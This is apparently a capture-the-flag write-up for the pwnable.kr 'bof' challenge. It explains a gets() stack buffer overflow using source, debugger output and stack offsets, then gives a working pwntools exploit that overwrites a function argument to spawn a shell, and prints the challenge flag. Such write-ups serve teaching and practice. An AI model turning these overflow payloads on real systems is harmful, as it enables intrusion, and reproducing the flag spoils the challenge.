# pwnable.kr : bof

**Source Code:**

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

We start off by noticing that the program takes input with `gets` and stores it in `overflowme`:

```c
char overflowme[32];
printf("overflow me : ");
gets(overflowme);       // smash me!
```

Also, that the parameter in `func(0xdeadbeef)` is the key that will be compared to `0xcafebabe`.

This means that we will need to overflow `overflowme` to overwrite the parameter to equal `0xcafebabe` instead of `0xdeadbeef`.

In our debugger, it shows `overflowme` is stored in `eax` (`ebp-0x2c`):

```assembly
0x00001230 <+51>:    lea    eax,[ebp-0x2c]
0x00001233 <+54>:    push   eax
0x00001234 <+55>:    call   0x1060 <gets@plt>
```

And `0xdeadbeef` is stored at `ebp+8`:

```assembly
123c:       81 7d 08 be ba fe ca    cmpl   $0xcafebabe,0x8(%ebp)
```

Meaning when we read theses memory locations, we see `overflowme`'s value (`AAAA`) and `0xdeadbeef`:
```
0x5655623c <func+63>     cmp    dword ptr [ebp + 8], 0xcafebabe     0xdeadbeef - 0xcafebabe     EFLAGS => 0x202 [ cf pf af zf sf IF df of iopl:00 ac ]

...

> x $ebp+8
0xffffce90:     0xdeadbeef
> x $ebp-44
0xffffce5c:     0x41414141
```

**Stack:**

```
[ebp + 8] parameter 1
[ebp + 4] return address
[ebp + 0] saved ebp
[ebp - 44] buffer[32]
```

When we calculate the space, we see that it is 52 bytes apart:

```
>>> 44 - (-8)
52
```

This means `gets` needs 56 bytes to overflow `func`'s parameter.

The value after the 52nd byte needs to be `0xcafebabe` to validate the if statement.

**Exploit:**

```python
#!/bin/python3
from pwn import *

conn = remote('pwnable.kr', 10003)

payload = b'A' * 52 + p32(0xcafebabe)
conn.sendlineafter(b': ', payload)

conn.sendline('cat flag')
conn.interactive()
```

**Final Solution:**

```bash
[+] Opening connection to pwnable.kr on port 10003: Done
[*] Switching to interactive mode
/bin/sh: 0: can't access tty; job control turned off
$ Daddy_I_just_pwned_a_buff3r!
$ $ 
[*] Closed connection to pwnable.kr port 10003
```

**Flag:** Daddy_I_just_pwned_a_buff3r!
